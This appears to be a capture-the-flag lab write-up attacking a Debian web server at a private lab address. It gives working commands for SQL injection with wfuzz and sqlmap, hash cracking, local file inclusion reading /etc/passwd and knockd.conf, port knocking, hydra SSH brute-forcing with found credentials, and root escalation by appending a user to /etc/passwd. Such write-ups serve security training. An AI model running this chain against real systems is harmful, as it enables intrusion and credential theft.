# Name
## Information Gathering
#### Ports/Services
22/tcp ssh
80/tcp http

#### Credentials
- `admin:transorbital1`

## Enumeration
### Nmap scan
```bash
PORT   STATE    SERVICE REASON              VERSION
22/tcp filtered ssh     port-unreach ttl 63
80/tcp open     http    syn-ack ttl 63      Apache httpd 2.4.38 ((Debian))
|_http-title: Example.com - Staff Details - Welcome
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
```

### 80/tcp
- Software
	- Apache 2.4.39
	- PHP

- Fuzzing input fields for forms for SQLi
```bash
wfuzz -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d "search=FUZZ" --hw 86 "http://192.168.78.209/results.php"
```
- There is definetly indications of a SQLi occuring in the `search` parameter

- Using sqlmap to exploit
- List databases
```bash
sqlmap -r search.req --dbs
available databases [3]:
[*] information_schema
[*] Staff
[*] users
```

- `users` database
```bash
sqlmap -r search.req -D users --tables
Database: users
[1 table]
+-------------+
| UserDetails |
+-------------+
```
- `UserDetails` table
```bash
sqlmap -r search.req -D users -T UserDetails
```


- `Staff` database
```bash
sqlmap -r search.req -D Staff --tables
[2 tables]
+--------------+
| StaffDetails |
| Users        |
+--------------+
```
- `StaffDetails` table
	- **This lists passwords in cleartext for user accounts**
- `Users` table
```bash
sqlmap -r search.req -D Staff -T Users --dump
+--------+----------------------------------+----------+
| UserID | Password                         | Username |
+--------+----------------------------------+----------+
| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |
+--------+----------------------------------+----------+
```
- Attempt dictionary attack
- Throwing the hash into `crackstation.net` get back a hit
	- `admin:transorbital1`

- Once logged in, there is a message on each page `File does not exist`
- Testing the following URL for LFI: 
	- `http://192.168.78.209/manage.php?file=../../../../../../etc/passwd` - SUCCESS
- Reading which configuration files are available in `/etc/` directory using `conf-files.txt`
```bash
wfuzz -w conf-files.txt -b "PHPSESSID=n341d542smhdvfcbhhbko8u7n6" "http://192.168.78.209/manage.php?file=FUZZ"
```
- Looking at nmap scan, SSH is filtered. This may indicate port knocking. Viewing `http://192.168.78.209/manage.php?file=../../../../../../../etc/knockd.conf`
```
[openSSH]
	sequence    = 7469,8475,9842
	seq_timeout = 25
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn
[closeSSH]
	sequence    = 9842,8475,7469
	seq_timeout = 25
	command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn
```
- Performing port knocking
```bash
nmap -p7469,8475,9842 192.168.78.209

nmap -p22 192.168.78.209
PORT   STATE SERVICE
22/tcp open  ssh
```

- Performing dictionary attack with all usernames and passwords discovered so far
```bash
hydra -L users.txt -P passwords.txt -t 4 ssh://192.168.78.209 -V -F

[22][ssh] host: 192.168.78.209   login: chandlerb   password: UrAG0D!
```
- Got a hits 
	- `chandlerb:UrAG0D!`
	- `joeyt:Passw0rd`
	- `janitor:Ilovepeepee`


## Exploitation


## Privilege Escalation
- In `janitor` home directory, there is a hidden dot file `passwords-found-on-post-it-notes.txt` which contains some passwords that were not in the database dump
- Running hydra using this new password list:
	- `fredf:B4-Tru3-001`
- `fredf` gets you `local.txt`

- Running `sudo -l` as `fredf`
```bash
sudo -l

(root) NOPASSWD: /opt/devstuff/dist/test/test
```

- `test.py`
```python
#!/usr/bin/python

import sys

if len (sys.argv) != 3 :
    print ("Usage: python test.py read append")
    sys.exit (1)

else :
    f = open(sys.argv[1], "r")
    output = (f.read())

    f = open(sys.argv[2], "a")
    f.write(output)
    f.close()
```

- With `test` I can append to any file. I create `/tmp/passwd` with the following contents:
```
cerberus:$6$Qbdpm70f94ZHe6fS$QWx5E2pw34OBLz/MNDJYwPUEfdEZz9rd57c0xK5xjoVXvd33ezpSmFayAgPKRGvOMLYWqciNxfPR3NhIQ9bm7/:0:0:root:/root:/bin/bash
```
- Where the hash was generated by performing the following:
```bash
mkpasswd -m sha-512 pass
$6$Qbdpm70f94ZHe6fS$QWx5E2pw34OBLz/MNDJYwPUEfdEZz9rd57c0xK5xjoVXvd33ezpSmFayAgPKRGvOMLYWqciNxfPR3NhIQ9bm7/
```
- When echoing the hash into the file make sure to escape the dollar signs 

- Using the following appends your new root user to `/etc/passwd`
```bash
sudo ./test /tmp/passwd /etc/passwd
```
- You can then use `su cerberus` with the password `pass` to gain root
Add 